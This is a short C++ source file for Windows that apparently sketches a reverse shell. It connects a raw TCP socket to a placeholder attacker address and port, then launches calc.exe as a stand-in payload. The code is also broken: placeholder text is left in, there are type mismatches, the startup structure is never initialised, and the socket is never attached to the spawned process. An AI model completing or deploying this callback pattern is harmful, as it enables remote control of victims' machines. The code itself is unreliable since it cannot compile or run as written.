#include <windows.h> // to deal with Windows API
#include <iostream> // for input/output
#include <winsock.h>
using namespace std ;
int connection() {
    std::wstring ip = L"your ip";
    short port = put your port ;
    WSADATA wsadata;
    SOCKET wSOCk;
    struct sockaddr_in sock;
    STARTUPINFOA st;
    PROCESS_INFORMATION pi;
    WSAStartup(MAKEWORD(2, 2), &wsadata);
    wSOCk = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
    sock.sin_family = AF_INET;
    sock.sin_port = htons(port);
    sock.sin_addr.s_addr = inet_addr(ip.c_str());
    WSAConnect(wSOCk, (SOCKADDR*)&sock, sizeof(sock), NULL, NULL, NULL, NULL);

    // Launch the Windows Calculator
    std::wstring widePath = L"C:\\Windows\\System32\\calc.exe";
    if (!CreateProcess(NULL, const_cast<LPWSTR>(widePath.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &st, &pi)) {
        std::cerr << "Failed to create process. Error code: " << GetLastError() << std::endl;
    }

    // Close handles and cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(wSOCk);
    WSACleanup();
    return 0;
}

int main() {
    connection();
    return 0;
}
